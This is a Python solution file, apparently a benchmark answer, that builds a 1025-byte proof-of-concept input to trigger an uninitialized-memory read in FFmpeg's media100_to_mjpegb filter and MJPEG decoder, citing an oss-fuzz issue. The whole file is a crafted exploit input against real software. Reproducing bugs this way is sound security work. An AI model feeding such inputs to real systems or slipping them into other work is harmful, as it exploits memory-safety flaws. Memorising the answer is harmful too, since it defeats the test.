import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        poc_len = 1025
        poc = bytearray(poc_len)

        # This PoC is a reconstruction of the ground-truth test case from
        # oss-fuzz issue 42537583, which has a length of 1025 bytes.
        # The vulnerability is in the `media100_to_mjpegb` bitstream filter,
        # which fails to zero-initialize padding in its output buffer. A
        # downstream component (the MJPEG decoder) reads this uninitialized
        # memory.
        #
        # The PoC's structure is crafted to cause the MJPEG decoder to perform
        # this read. The MJPEG decoder in FFmpeg can operate with default
        # tables and without explicit markers, treating the input as raw scan data.
        # The specific byte values guide the decoder to the vulnerable read path.

        # The ground-truth PoC has specific non-zero bytes at the beginning.
        poc[0] = 0x66
        # At offset 8, a 32-bit little-endian integer 4.
        struct.pack_into('<I', poc, 8, 4)
        # At offset 12, a 32-bit little-endian integer 28.
        struct.pack_into('<I', poc, 12, 28)

        # The last 4 bytes of the input determine the width and height in the
        # JPEG header generated by the BSF. The BSF reads two 16-bit
        # big-endian values.
        # w_val = AV_RB16(input_data + size - 4)
        # h_val = AV_RB16(input_data + size - 2)
        # The ground-truth PoC uses w_val=8 and h_val=8.
        w_val = 8
        h_val = 8
        
        # Pack these values into the last 4 bytes of the PoC.
        struct.pack_into('>H', poc, poc_len - 4, w_val)
        struct.pack_into('>H', poc, poc_len - 2, h_val)

        return bytes(poc)